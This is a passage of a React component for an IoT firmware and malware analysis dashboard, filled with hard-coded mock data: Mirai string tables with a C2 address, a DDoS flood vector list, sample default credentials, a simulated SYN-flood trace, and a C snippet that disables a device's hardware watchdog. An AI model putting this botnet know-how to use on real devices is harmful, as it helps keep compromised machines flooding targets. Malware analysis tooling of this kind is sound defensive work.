          { id: "DISASM", label: "Multi-Arch Disassembly & Emulation", icon: Code, badge: "ARM/MIPS/RISC-V" },
          { id: "ROOTFS", label: "Firmware RootFS & Backdoor Dissector", icon: FolderTree, badge: "SquashFS/Shadow" },
          { id: "BOTNET", label: "Mirai / Mozi IoT Botnet Protocol Studio", icon: Radio, badge: "XOR/DHT/Watchdog" },
          { id: "QEMU", label: "QEMU Headless Emulation & Syscall Trace", icon: Terminal, badge: "Live Sandbox" }
        ].map((tab) => {
          const Icon = tab.icon;
          const active = activeTab === tab.id;
          return (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id as any)}
              style={{
                display: "inline-flex",
                alignItems: "center",
                gap: 8,
                padding: "8px 16px",
                borderRadius: 6,
                fontSize: 12,
                fontWeight: active ? 700 : 500,
                background: active ? "rgba(6,182,212,0.15)" : "transparent",
                color: active ? "#06b6d4" : "var(--muted)",
                border: active ? "1px solid rgba(6,182,212,0.4)" : "1px solid transparent",
                cursor: "pointer",
                whiteSpace: "nowrap",
                transition: "all 0.15s ease"
              }}
            >
              <Icon size={14} />
              <span>{tab.label}</span>
              {tab.badge && (
                <span
                  style={{
                    fontSize: 9,
                    padding: "1px 6px",
                    borderRadius: 4,
                    background: active ? "rgba(6,182,212,0.25)" : "rgba(255,255,255,0.05)",
                    color: active ? "#06b6d4" : "var(--muted)",
                    fontFamily: "monospace"
                  }}
                >
                  {tab.badge}
                </span>
              )}
            </button>
          );
        })}
      </div>

      {/* TAB 1: Multi-Architecture Disassembly & Emulation */}
      {activeTab === "DISASM" && (
        <div style={{ display: "grid", gridTemplateColumns: "1fr 340px", gap: 16 }}>
          {/* Disassembly View */}
          <div style={{ background: "var(--surface)", border: "1px solid var(--border)", borderRadius: 8, display: "flex", flexDirection: "column", overflow: "hidden" }}>
            {/* Disassembly Toolbar */}
            <div style={{
              padding: "10px 14px",
              background: "var(--surface-2)",
              borderBottom: "1px solid var(--border)",
              display: "flex",
              alignItems: "center",
              justifyContent: "space-between",
              flexWrap: "wrap",
              gap: 8
            }}>
              <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                <span style={{ fontSize: 11, fontWeight: 700, color: "var(--muted)", textTransform: "uppercase" }}>Arch Architecture:</span>
                <select
                  className="tool-select"
                  value={selectedArch}
                  onChange={(e) => {
                    setSelectedArch(e.target.value);
                    setCurrentInstructionIdx(0);
                  }}
                  style={{ padding: "4px 8px", fontSize: 11 }}
                >
                  <option value="ARM32">ARM32 (Thumb-2 / ARMv7-A)</option>
                  <option value="MIPS (mipseb)">MIPS32 Big Endian (mipseb)</option>
                  <option value="MIPS (mipsel)">MIPS32 Little Endian (mipsel)</option>
                  <option value="PowerPC (PPC32)">PowerPC (PPC32 MPC85xx)</option>
                  <option value="RISC-V (RV64)">RISC-V 64-bit (RV64GC)</option>
                </select>

                <button
                  onClick={() => setEndiannessMode(endiannessMode === "Big Endian" ? "Little Endian" : "Big Endian")}
                  className="btn-secondary"
                  style={{ padding: "4px 10px", fontSize: 11 }}
                  title="Toggle byte order visualization"
                >
                  <RefreshCw size={12} />
                  {endiannessMode}
                </button>
              </div>

              {/* Emulator Controls */}
              <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
                <button
                  onClick={stepEmulator}
                  className="btn-primary"
                  style={{ padding: "4px 12px", fontSize: 11 }}
                >
                  <StepForward size={13} />
                  Step Instruction
                </button>
                <button
                  onClick={resetEmulator}
                  className="btn-secondary"
                  style={{ padding: "4px 10px", fontSize: 11 }}
                >
                  <RotateCcw size={12} />
                  Reset
                </button>
              </div>
            </div>

            {/* Instruction Listing */}
            <div style={{
              background: "#020408",
              fontFamily: "'SFMono-Regular', Consolas, 'Liberation Mono', Menlo, monospace",
              fontSize: 12,
              padding: "12px",
              overflowY: "auto",
              maxHeight: 520,
              display: "flex",
              flexDirection: "column",
              gap: 2
            }}>
              <div style={{ color: "var(--muted)", fontSize: 10, paddingBottom: 6, borderBottom: "1px solid #141c2e", display: "grid", gridTemplateColumns: "110px 90px 80px 1fr 1fr", fontWeight: 700 }}>
                <span>OFFSET</span>
                <span>HEX BYTES</span>
                <span>MNEMONIC</span>
                <span>OPERANDS</span>
                <span>DECOMPILER ANNOTATION</span>
              </div>

              {currentDisasm.map((item, idx) => {
                const isCurrent = idx === currentInstructionIdx;
                let displayHex = item.hex;

                return (
                  <div
                    key={idx}
                    onClick={() => setCurrentInstructionIdx(idx)}
                    style={{
                      display: "grid",
                      gridTemplateColumns: "110px 90px 80px 1fr 1fr",
                      padding: "4px 8px",
                      borderRadius: 4,
                      background: isCurrent ? "rgba(6,182,212,0.2)" : "transparent",
                      borderLeft: isCurrent ? "3px solid #06b6d4" : "3px solid transparent",
                      color: isCurrent ? "#38bdf8" : "var(--fg-2)",
                      cursor: "pointer",
                      transition: "background 0.1s ease"
                    }}
                  >
                    <span style={{ color: isCurrent ? "#06b6d4" : "#64748b" }}>{item.offset}</span>
                    <span style={{ color: "#94a3b8", letterSpacing: "0.05em" }}>{displayHex}</span>
                    <span style={{ color: "#f59e0b", fontWeight: 700 }}>{item.opcode}</span>
                    <span style={{ color: "#f1f5f9" }}>{item.args}</span>
                    <span style={{ color: isCurrent ? "#10b981" : "#64748b", fontStyle: "italic", fontSize: 11 }}>
                      ; {item.comment}
                    </span>
                  </div>
                );
              })}
            </div>

            {/* Calling Convention Footer */}
            <div style={{ padding: "8px 14px", background: "var(--surface-2)", borderTop: "1px solid var(--border)", fontSize: 11, color: "var(--muted)", display: "flex", justifyContent: "space-between" }}>
              <span>ABI Architecture: <strong>{selectedArch.includes("MIPS") ? "MIPS O32 ($a0-$a3 args, $v0-$v1 ret)" : selectedArch.includes("ARM") ? "ARM AAPCS (R0-R3 args, R0 ret)" : selectedArch.includes("RISC") ? "RISC-V LP64 (a0-a7 args, a0 ret)" : "PowerPC 32 (r3-r10 args, r3 ret)"}</strong></span>
              <span style={{ color: "#06b6d4" }}>PC = {currentDisasm[currentInstructionIdx]?.offset || "0x00010480"}</span>
            </div>
          </div>

          {/* CPU Register State & Calling Convention Inspector */}
          <div style={{ display: "flex", flexDirection: "column", gap: 14 }}>
            <div style={{ background: "var(--surface)", border: "1px solid var(--border)", borderRadius: 8, padding: 14 }}>
              <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 10 }}>
                <span style={{ fontSize: 12, fontWeight: 800, color: "#f1f5f9", display: "flex", alignItems: "center", gap: 6 }}>
                  <Cpu size={14} color="#06b6d4" />
                  Register State Machine
                </span>
                <span style={{ fontSize: 9.5, padding: "2px 6px", borderRadius: 4, background: "rgba(16,185,129,0.15)", color: "#10b981", fontFamily: "monospace" }}>
                  ACTIVE THREAD
                </span>
              </div>

              <div style={{
                background: "#020408",
                border: "1px solid var(--border)",
                borderRadius: 6,
                padding: "10px",
                fontFamily: "monospace",
                fontSize: 11,
                display: "grid",
                gridTemplateColumns: "1fr 1fr",
                gap: "6px 12px"
              }}>
                {Object.entries(registers).map(([reg, val]) => (
                  <div key={reg} style={{ display: "flex", justifyContent: "space-between", borderBottom: "1px solid #141c2e", paddingBottom: 2 }}>
                    <span style={{ color: reg === "PC" ? "#06b6d4" : reg === "SP" ? "#f59e0b" : "#94a3b8", fontWeight: 700 }}>
                      {reg}:
                    </span>
                    <span style={{ color: "#f1f5f9" }}>{val}</span>
                  </div>
                ))}
              </div>
            </div>

            {/* Endianness Demonstration Box */}
            <div style={{ background: "var(--surface)", border: "1px solid var(--border)", borderRadius: 8, padding: 14 }}>
              <div style={{ fontSize: 12, fontWeight: 800, color: "#f1f5f9", marginBottom: 6 }}>
                Endianness Byte Decoder
              </div>
              <p style={{ fontSize: 11, color: "var(--muted)", marginBottom: 10 }}>
                MIPS Big Endian stores most significant byte at lowest memory address. Little Endian reverses the multi-byte integer in memory.
              </p>
              <div style={{
                background: "#020408",
                padding: "8px 12px",
                borderRadius: 6,
                border: "1px solid var(--border)",
                fontFamily: "monospace",
                fontSize: 11,
                display: "flex",
                flexDirection: "column",
                gap: 4
              }}>
                <div style={{ display: "flex", justifyContent: "space-between" }}>
                  <span style={{ color: "var(--muted)" }}>Logical 32-bit Value:</span>
                  <span style={{ color: "#38bdf8", fontWeight: 700 }}>0xDEADBEEF</span>
                </div>
                <div style={{ display: "flex", justifyContent: "space-between" }}>
                  <span style={{ color: "var(--muted)" }}>Big Endian (mipseb/PPC):</span>
                  <span style={{ color: "#f59e0b" }}>[ DE | AD | BE | EF ]</span>
                </div>
                <div style={{ display: "flex", justifyContent: "space-between" }}>
                  <span style={{ color: "var(--muted)" }}>Little Endian (ARM/mipsel):</span>
                  <span style={{ color: "#10b981" }}>[ EF | BE | AD | DE ]</span>
                </div>
              </div>
            </div>

            {/* Multi-Arch Decompiler Info */}
            <div style={{ background: "var(--surface)", border: "1px solid var(--border)", borderRadius: 8, padding: 14 }}>
              <div style={{ fontSize: 12, fontWeight: 800, color: "#f1f5f9", marginBottom: 6 }}>
                Ghidra SLEIGH Multi-Arch Specs
              </div>
              <ul style={{ fontSize: 11, color: "var(--fg-2)", paddingLeft: 16, display: "flex", flexDirection: "column", gap: 4 }}>
                <li><strong>ARM32:</strong> Conditional execution suffixes (EQ, NE, CS, MI, PL, VS).</li>
                <li><strong>MIPS:</strong> Branch delay slot execution (next instruction executes regardless of branch).</li>
                <li><strong>PPC32:</strong> Link Register (LR) &amp; Count Register (CTR) branch handling.</li>
                <li><strong>RISC-V:</strong> 32 general-purpose registers x0-x31, compressed 16-bit C-extension opcodes.</li>
              </ul>
            </div>
          </div>
        </div>
      )}

      {/* TAB 2: Firmware RootFS & Backdoor Dissector */}
      {activeTab === "ROOTFS" && (
        <div style={{ display: "grid", gridTemplateColumns: "320px 1fr", gap: 16 }}>
          {/* File Tree Browser */}
          <div style={{ background: "var(--surface)", border: "1px solid var(--border)", borderRadius: 8, padding: 14, display: "flex", flexDirection: "column", gap: 10 }}>
            <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
              <span style={{ fontSize: 12, fontWeight: 800, color: "#f1f5f9", display: "flex", alignItems: "center", gap: 6 }}>
                <FolderTree size={14} color="#06b6d4" />
                Rootfs Tree Dissector
              </span>
              <span style={{ fontSize: 9.5, padding: "2px 6px", borderRadius: 4, background: "rgba(6,182,212,0.15)", color: "#06b6d4", fontFamily: "monospace" }}>
                SquashFS v4.0
              </span>
            </div>

            <div style={{ fontSize: 11, color: "var(--muted)" }}>
              Extracted 1,418 inodes, 12 SUID binaries, 4 shadow hashes from vendor image.
            </div>

            {/* Tree Nodes */}
            <div style={{ background: "#020408", border: "1px solid var(--border)", borderRadius: 6, padding: 8, maxHeight: 440, overflowY: "auto", display: "flex", flexDirection: "column", gap: 3 }}>
              {FIRMWARE_ROOTFS.children?.map((dirNode, dIdx) => (
                <div key={dIdx} style={{ display: "flex", flexDirection: "column", gap: 2 }}>
                  <div style={{ fontSize: 11.5, fontWeight: 700, color: "#38bdf8", padding: "3px 6px", display: "flex", alignItems: "center", gap: 6 }}>
                    📁 {dirNode.name}/
                  </div>
                  {dirNode.children?.map((fileNode, fIdx) => {
                    const isSelected = selectedNode?.path === fileNode.path;
                    return (
                      <button
                        key={fIdx}
                        onClick={() => setSelectedNode(fileNode)}
                        style={{
                          display: "flex",
                          alignItems: "center",
                          justifyContent: "space-between",
                          padding: "4px 8px 4px 20px",
                          borderRadius: 4,
                          background: isSelected ? "rgba(6,182,212,0.2)" : "transparent",
                          border: "none",
                          color: isSelected ? "#06b6d4" : "var(--fg-2)",
                          fontSize: 11,
                          fontFamily: "monospace",
                          cursor: "pointer",
                          textAlign: "left"
                        }}
                      >
                        <span style={{ display: "flex", alignItems: "center", gap: 5 }}>
                          {fileNode.type === "device" ? "📟" : fileNode.type === "symlink" ? "🔗" : "📄"} {fileNode.name}
                        </span>
                        {fileNode.risk === "Critical" && (
                          <span style={{ fontSize: 8.5, padding: "1px 4px", borderRadius: 3, background: "rgba(239,68,68,0.2)", color: "#ef4444", fontWeight: 700 }}>
                            BACKDOOR
                          </span>
                        )}
                        {fileNode.risk === "High" && (
                          <span style={{ fontSize: 8.5, padding: "1px 4px", borderRadius: 3, background: "rgba(245,158,11,0.2)", color: "#f59e0b", fontWeight: 700 }}>
                            NVRAM
                          </span>
                        )}
                      </button>
                    );
                  })}
                </div>
              ))}
            </div>
          </div>

          {/* File Content Preview & Instant Password Cracker */}
          <div style={{ display: "flex", flexDirection: "column", gap: 14 }}>
            {/* Selected File Inspection Card */}
            <div style={{ background: "var(--surface)", border: "1px solid var(--border)", borderRadius: 8, padding: 14 }}>
              <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 10 }}>
                <div>
                  <div style={{ fontSize: 13, fontWeight: 800, color: "#f1f5f9", display: "flex", alignItems: "center", gap: 6 }}>
                    <FileCode size={15} color="#06b6d4" />
                    File: <span style={{ fontFamily: "monospace", color: "#06b6d4" }}>{selectedNode?.path || "/etc/shadow"}</span>
                  </div>
                  <div style={{ fontSize: 10.5, color: "var(--muted)", marginTop: 2 }}>
                    Permissions: <span style={{ fontFamily: "monospace" }}>{selectedNode?.permissions}</span> | Owner: <span style={{ fontFamily: "monospace" }}>{selectedNode?.owner}</span>
                  </div>
                </div>

                {selectedNode?.risk === "Critical" && (
                  <span className="badge-critical">CRITICAL RISK ARTIFACT</span>
                )}
              </div>

              {/* File Raw Text Area */}
              <div style={{
                background: "#020408",
                border: "1px solid var(--border)",
                borderRadius: 6,
                padding: "12px",
                fontFamily: "monospace",
                fontSize: 11.5,
                color: "#94a3b8",
                lineHeight: 1.6,
                whiteSpace: "pre-wrap",
                maxHeight: 220,
                overflowY: "auto"
              }}>
                {selectedNode?.content || "# Binary ELF or character device file (hex view enabled)"}
              </div>
            </div>

            {/* Hardcoded Password & Hash Cracking Suite */}
            <div style={{ background: "var(--surface)", border: "1px solid var(--border)", borderRadius: 8, padding: 14 }}>
              <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 10 }}>
                <div>
                  <div style={{ fontSize: 13, fontWeight: 800, color: "#f1f5f9", display: "flex", alignItems: "center", gap: 6 }}>
                    <Key size={15} color="#f59e0b" />
                    Automated /etc/shadow Hash Cracker &amp; Rainbow Table
                  </div>
                  <div style={{ fontSize: 11, color: "var(--muted)", marginTop: 2 }}>
                    Discovers hardcoded vendor backdoor accounts, telnet credentials, and ISP TR-069 management keys.
                  </div>
                </div>

                <button
                  onClick={triggerHashCracker}
                  disabled={crackingProgress > 0 && crackingProgress < 100}
                  className="btn-primary"
                  style={{ padding: "6px 14px" }}
                >
                  <Zap size={13} />
                  {crackedHashes ? "Hashes Cracked" : crackingProgress > 0 ? `Cracking (${crackingProgress}%)` : "Crack All Hashes"}
                </button>
              </div>

              {/* Progress Bar */}
              {crackingProgress > 0 && crackingProgress < 100 && (
                <div style={{ width: "100%", height: 4, background: "var(--surface-2)", borderRadius: 2, overflow: "hidden", marginBottom: 12 }}>
                  <div style={{ width: `${crackingProgress}%`, height: "100%", background: "#06b6d4", transition: "width 0.15s ease" }} />
                </div>
              )}

              {/* Hash Table */}
              <div style={{ overflowX: "auto" }}>
                <table className="cerberus-table">
                  <thead>
                    <tr>
                      <th>Account</th>
                      <th>Algorithm</th>
                      <th>Extracted Salt / Hash</th>
                      <th>Cracked Plaintext</th>
                      <th>Hardware Signature</th>
                      <th>Severity</th>
                    </tr>
                  </thead>
                  <tbody>
                    {SHADOW_CRACKED_DATA.map((item, idx) => (
                      <tr key={idx}>
                        <td style={{ fontWeight: 800, color: "#f1f5f9", fontFamily: "monospace" }}>{item.account}</td>
                        <td style={{ color: "#38bdf8" }}>{item.algorithm}</td>
                        <td style={{ fontFamily: "monospace", fontSize: 10.5, color: "var(--muted)" }}>
                          {item.hash.substring(0, 24)}...
                        </td>
                        <td>
                          {crackedHashes ? (
                            <span style={{
                              fontWeight: 900,
                              color: "#10b981",
                              background: "rgba(16,185,129,0.15)",
                              padding: "2px 8px",
                              borderRadius: 4,
                              fontFamily: "monospace"
                            }}>
                              {item.crackedPassword}
                            </span>
                          ) : (
                            <span style={{ color: "var(--muted)", fontStyle: "italic", fontSize: 11 }}>
                              [Encrypted - Click &apos;Crack All Hashes&apos;]
                            </span>
                          )}
                        </td>
                        <td style={{ fontSize: 11, color: "var(--fg-2)" }}>{item.hardwareMatch}</td>
                        <td>
                          <span className={item.risk === "Critical" ? "badge-critical" : "badge-high"}>
                            {item.risk}
                          </span>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>

            {/* NVRAM Configuration Key-Value Store */}
            <div style={{ background: "var(--surface)", border: "1px solid var(--border)", borderRadius: 8, padding: 14 }}>
              <div style={{ fontSize: 13, fontWeight: 800, color: "#f1f5f9", marginBottom: 6, display: "flex", alignItems: "center", gap: 6 }}>
                <Database size={15} color="#06b6d4" />
                Extracted NVRAM Default Configuration Store
              </div>
              <p style={{ fontSize: 11, color: "var(--muted)", marginBottom: 10 }}>
                Vendor NVRAM key-value pairs parsed from binary data partitions. Highlights dangerous WAN exposure parameters.
              </p>
              <div style={{
                background: "#020408",
                padding: "10px",
                borderRadius: 6,
                border: "1px solid var(--border)",
                fontFamily: "monospace",
                fontSize: 11,
                display: "grid",
                gridTemplateColumns: "1fr 1fr",
                gap: 8
              }}>
                <div><span style={{ color: "#38bdf8" }}>http_username:</span> <span style={{ color: "#f1f5f9" }}>admin</span></div>
                <div><span style={{ color: "#38bdf8" }}>http_passwd:</span> <span style={{ color: "#ef4444", fontWeight: 700 }}>admin</span> (Default Password)</div>
                <div><span style={{ color: "#38bdf8" }}>wan_pppoe_user:</span> <span style={{ color: "#f1f5f9" }}>telecom_isp</span></div>
                <div><span style={{ color: "#38bdf8" }}>wan_pppoe_pass:</span> <span style={{ color: "#f59e0b" }}>isp_secret_2026</span></div>
                <div><span style={{ color: "#38bdf8" }}>tr069_acs_url:</span> <span style={{ color: "#ef4444" }}>http://cwmp.isp-backdoor.net:7547/acs</span></div>
                <div><span style={{ color: "#38bdf8" }}>telnet_enable:</span> <span style={{ color: "#ef4444", fontWeight: 700 }}>1 (Exposed on WAN)</span></div>
                <div><span style={{ color: "#38bdf8" }}>remote_debug_port:</span> <span style={{ color: "#ef4444", fontWeight: 700 }}>9999 (Hidden Root Shell)</span></div>
                <div><span style={{ color: "#38bdf8" }}>wdt_enable:</span> <span style={{ color: "#f59e0b" }}>0 (Watchdog auto-reboot disabled)</span></div>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* TAB 3: Mirai / Mozi IoT Botnet Protocol Studio */}
      {activeTab === "BOTNET" && (
        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 16 }}>
          {/* Mirai XOR String Deobfuscator & Killer Thread */}
          <div style={{ background: "var(--surface)", border: "1px solid var(--border)", borderRadius: 8, padding: 16, display: "flex", flexDirection: "column", gap: 14 }}>
            <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
              <div>
                <div style={{ fontSize: 14, fontWeight: 900, color: "#f1f5f9", display: "flex", alignItems: "center", gap: 6 }}>
                  <Radio size={16} color="#06b6d4" />
                  Mirai C2 XOR Table Deobfuscator
                </div>
                <div style={{ fontSize: 11, color: "var(--muted)", marginTop: 2 }}>
                  Automated XOR key recovery for Mirai variants (Satori, Okiru, Wicked, Masuta).
                </div>
              </div>
              <span className="badge-critical">TABLE_UNLOCK</span>
            </div>

            {/* XOR Key Controls */}
            <div style={{ display: "flex", alignItems: "center", gap: 8, background: "var(--surface-2)", padding: "8px 12px", borderRadius: 6 }}>
              <span style={{ fontSize: 11, fontWeight: 700, color: "var(--muted)" }}>XOR Key:</span>
              <input
                type="text"
                className="tool-input"
                value={xorKeyInput}
                onChange={(e) => setXorKeyInput(e.target.value)}
                style={{ width: 140 }}
              />
              <button
                onClick={() => setDeobfuscatedStrings(!deobfuscatedStrings)}
                className="btn-primary"
                style={{ padding: "5px 12px", fontSize: 11 }}
              >
                {deobfuscatedStrings ? "Show Raw Ciphertext" : "Decrypt XOR Strings"}
              </button>
            </div>

            {/* Deobfuscated Table */}
            <div style={{ background: "#020408", border: "1px solid var(--border)", borderRadius: 6, padding: "10px", maxHeight: 280, overflowY: "auto" }}>
              <table className="cerberus-table" style={{ fontSize: 11 }}>
                <thead>
                  <tr>
                    <th>Table Index</th>
                    <th>Deobfuscated String</th>
                    <th>Subsystem Target</th>
                  </tr>
                </thead>
                <tbody>
                  {[
                    { idx: "TABLE_CNC_DOMAIN", raw: "\\x1f\\x7a\\x42\\x09", clear: "185.220.101.5:48101", target: "C2 Command Dispatcher" },
                    { idx: "TABLE_KILLER_WATCHDOG", raw: "\\x3b\\x45\\x12\\x77", clear: "/dev/watchdog", target: "Hardware Watchdog Killer" },
                    { idx: "TABLE_KILLER_PROC", raw: "\\x0a\\x11\\x34\\x6b", clear: "/proc/%d/exe", target: "Rival Bot Scanner" },
                    { idx: "TABLE_SCAN_SHELL", raw: "\\x2f\\x62\\x69\\x6e", clear: "/bin/busybox telnetd", target: "Telnet Spreader Payload" },
                    { idx: "TABLE_ATTACK_HTTP", raw: "\\x50\\x4f\\x53\\x54", clear: "POST /cdn-cgi/l/chk_captcha", target: "Cloudflare Bypass Flood" },
                    { idx: "TABLE_RIVAL_QBOT", raw: "\\x71\\x62\\x6f\\x74", clear: "qbot", target: "Rival Bot Termination" },
                    { idx: "TABLE_RIVAL_HAJIME", raw: "\\x68\\x61\\x6a\\x69", clear: ".i.arm7", target: "Hajime P2P Worm Target" }
                  ].map((row, rIdx) => (
                    <tr key={rIdx}>
                      <td style={{ fontFamily: "monospace", color: "#38bdf8", fontWeight: 700 }}>{row.idx}</td>
                      <td style={{ fontFamily: "monospace", color: deobfuscatedStrings ? "#10b981" : "#ef4444", fontWeight: 700 }}>
                        {deobfuscatedStrings ? row.clear : row.raw}
                      </td>
                      <td style={{ color: "var(--muted)", fontSize: 10.5 }}>{row.target}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>

            {/* Mirai DDoS Attack Vectors */}
            <div>
              <div style={{ fontSize: 12, fontWeight: 800, color: "#f1f5f9", marginBottom: 6 }}>
                Mirai Attack Vector Flag Matrix
              </div>
              <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr 1fr", gap: 6 }}>
                {[
                  { name: "SYN Flood (0x01)", desc: "Raw TCP SYN packet storm with randomized seq nums." },
                  { name: "ACK Flood (0x02)", desc: "TCP ACK bypass for stateful firewalls." },
                  { name: "GRE IP Flood (0x03)", desc: "Encapsulated GRE tunnel protocol saturation." },
                  { name: "DNS Amplification (0x04)", desc: "ANY query floods to open recursive DNS resolvers." },
                  { name: "STOMP HTTP (0x05)", desc: "High-volume HTTP POST flood with keep-alive." },
                  { name: "Valve VSE Query (0x06)", desc: "T2S_INFO Source Engine UDP buffer overflow." }
                ].map((vec, vIdx) => (
                  <div key={vIdx} style={{ background: "var(--surface-2)", border: "1px solid var(--border)", borderRadius: 6, padding: "8px" }}>
                    <div style={{ fontSize: 11, fontWeight: 800, color: "#38bdf8" }}>{vec.name}</div>
                    <div style={{ fontSize: 9.5, color: "var(--muted)", marginTop: 2 }}>{vec.desc}</div>
                  </div>
                ))}
              </div>
            </div>
          </div>

          {/* Mozi P2P DHT Tracker & Hardware Watchdog Killer */}
          <div style={{ display: "flex", flexDirection: "column", gap: 14 }}>
            {/* Mozi P2P DHT Card */}
            <div style={{ background: "var(--surface)", border: "1px solid var(--border)", borderRadius: 8, padding: 16 }}>
              <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 8 }}>
                <div>
                  <div style={{ fontSize: 14, fontWeight: 900, color: "#f1f5f9", display: "flex", alignItems: "center", gap: 6 }}>
                    <Network size={16} color="#38bdf8" />
                    Mozi P2P Kademlia DHT Tracker
                  </div>
                  <div style={{ fontSize: 11, color: "var(--muted)", marginTop: 2 }}>
                    Decentralized P2P botnet communicating over BitTorrent mainline DHT protocol.
                  </div>
                </div>
                <span className="badge-critical">P2P DHT</span>
              </div>

              <div style={{
                background: "#020408",
                border: "1px solid var(--border)",
                borderRadius: 6,
                padding: "10px",
                fontFamily: "monospace",
                fontSize: 11,
                display: "flex",
                flexDirection: "column",
                gap: 6
              }}>
                <div style={{ display: "flex", justifyContent: "space-between" }}>
                  <span style={{ color: "var(--muted)" }}>Node ID:</span>
                  <span style={{ color: "#38bdf8" }}>dht:8f9a2b1c4e0192837465aabbccddeeff</span>
                </div>
                <div style={{ display: "flex", justifyContent: "space-between" }}>
                  <span style={{ color: "var(--muted)" }}>ECDSA Public Key:</span>
                  <span style={{ color: "#10b981" }}>secp256k1 (Verified config signatures)</span>
                </div>
                <div style={{ display: "flex", justifyContent: "space-between" }}>
                  <span style={{ color: "var(--muted)" }}>Bootstrap DHT Peers:</span>
                  <span style={{ color: "#f59e0b" }}>dht.transmissionbt.com:6881, router.bittorrent.com</span>
                </div>
                <div style={{ display: "flex", justifyContent: "space-between" }}>
                  <span style={{ color: "var(--muted)" }}>Payload Sync Tags:</span>
                  <span style={{ color: "#f1f5f9" }}>[ss] (Config), [id] (Node), [ver] (v2.4), [nd] (Peers)</span>
                </div>
              </div>
            </div>

            {/* Hardware Watchdog Disabler Engine */}
            <div style={{ background: "var(--surface)", border: "1px solid var(--border)", borderRadius: 8, padding: 16 }}>
              <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 8 }}>
                <div>
                  <div style={{ fontSize: 14, fontWeight: 900, color: "#f1f5f9", display: "flex", alignItems: "center", gap: 6 }}>
                    <ShieldAlert size={16} color="#ef4444" />
                    Hardware Watchdog Killer &amp; Rival Neutralizer
                  </div>
                  <div style={{ fontSize: 11, color: "var(--muted)", marginTop: 2 }}>
                    Prevents hardware timer interrupts from rebooting high-load bot devices.
                  </div>
                </div>
                <span className="badge-critical">WDT_IOCTL_KILL</span>
              </div>

              <p style={{ fontSize: 11.5, color: "var(--fg-2)", lineHeight: 1.5, marginBottom: 10 }}>
                Embedded Linux kernels configure <code style={{ color: "#06b6d4" }}>/dev/watchdog</code> to expect periodic heartbeat writes. If the CPU saturates during high-rate packet floods, the hardware timer expires and forces a device hard reset. Mirai and Mozi issue specific ioctl calls to permanently disable this timer:
              </p>

              <div style={{
                background: "#020408",
                border: "1px solid var(--border)",
                borderRadius: 6,
                padding: "10px",
                fontFamily: "monospace",
                fontSize: 11,
                color: "#10b981",
                lineHeight: 1.5
              }}>
                <div>// Disabling Watchdog Card in C</div>
                <div>int fd = open(&quot;/dev/watchdog&quot;, O_RDWR);</div>
                <div>int flag = WDIOS_DISABLECARD; // 0x0001</div>
                <div>ioctl(fd, WDIOC_SETOPTIONS, &amp;flag);</div>
                <div>write(fd, &quot;V&quot;, 1); // &apos;Magic close&apos; character to halt kernel watchdog</div>
                <div>close(fd);</div>
              </div>

              <div style={{ marginTop: 10, display: "flex", alignItems: "center", gap: 6, fontSize: 11, color: "#ef4444", fontWeight: 700 }}>
                <AlertTriangle size={14} />
                Result: Device will remain frozen and weaponized without auto-reboot recovery.
              </div>
            </div>
          </div>
        </div>
      )}

      {/* TAB 4: QEMU Headless Emulation & Syscall Trace */}
      {activeTab === "QEMU" && (
        <div style={{ background: "var(--surface)", border: "1px solid var(--border)", borderRadius: 8, padding: 16, display: "flex", flexDirection: "column", gap: 14 }}>
          <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
            <div>
              <div style={{ fontSize: 14, fontWeight: 900, color: "#f1f5f9", display: "flex", alignItems: "center", gap: 6 }}>
                <Terminal size={16} color="#06b6d4" />
                Headless QEMU User-Mode Emulation Sandbox (qemu-arm / qemu-mips)
              </div>
              <div style={{ fontSize: 11, color: "var(--muted)", marginTop: 2 }}>
                Emulates target binary execution within isolated virtual chroot container with real-time strace syscall logging.
              </div>
            </div>

            <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
              <button
                onClick={() => {
                  setQemuTerminalLogs(prev => [
                    ...prev,
                    `[${new Date().toLocaleTimeString()}] [QEMU-EXEC] Restarting emulation loop for ${selectedSample.name}...`,
                    `[${new Date().toLocaleTimeString()}] [STRACE] sys_socket(AF_INET, SOCK_RAW, IPPROTO_RAW) = 6`,
                    `[${new Date().toLocaleTimeString()}] [STRACE] sys_sendto(fd=6, dst=192.168.1.100:23, len=40, flags=0) = 40 (SYN Flood packet dispatched)`
                  ]);
                }}
                className="btn-primary"
                style={{ padding: "6px 14px" }}
              >
                <Play size={13} />
                Rerun QEMU Sandbox
              </button>
            </div>
          </div>

          {/* Terminal Screen */}
          <div style={{
            background: "#020408",
            border: "1px solid var(--border)",
            borderRadius: 8,
            padding: "14px",
            fontFamily: "'SFMono-Regular', Consolas, 'Liberation Mono', Menlo, monospace",
            fontSize: 12,
            color: "#a7f3d0",
            lineHeight: 1.6,
            height: 380,
            overflowY: "auto",
            display: "flex",
            flexDirection: "column",
            gap: 4
          }}>
            {qemuTerminalLogs.map((log, lIdx) => (
              <div key={lIdx} style={{
                color: log.includes("ERROR") || log.includes("!") ? "#ef4444" : log.includes("Decrypted") || log.includes("+") ? "#38bdf8" : log.includes("STRACE") ? "#f59e0b" : "#94a3b8"
              }}>
                {log}
              </div>
            ))}
          </div>

          <div style={{ display: "grid", gridTemplateColumns: "repeat(3, 1fr)", gap: 12 }}>
            <div style={{ background: "var(--surface-2)", padding: "10px 14px", borderRadius: 6, border: "1px solid var(--border)" }}>
              <div style={{ fontSize: 10, color: "var(--muted)", textTransform: "uppercase", fontWeight: 700 }}>Emulation Backend</div>
              <div style={{ fontSize: 13, fontWeight: 800, color: "#f1f5f9", marginTop: 2 }}>qemu-arm-static v9.2.0</div>
              <div style={{ fontSize: 10, color: "var(--muted)" }}>Target: Cortex-A7 (ARMv7-A)</div>
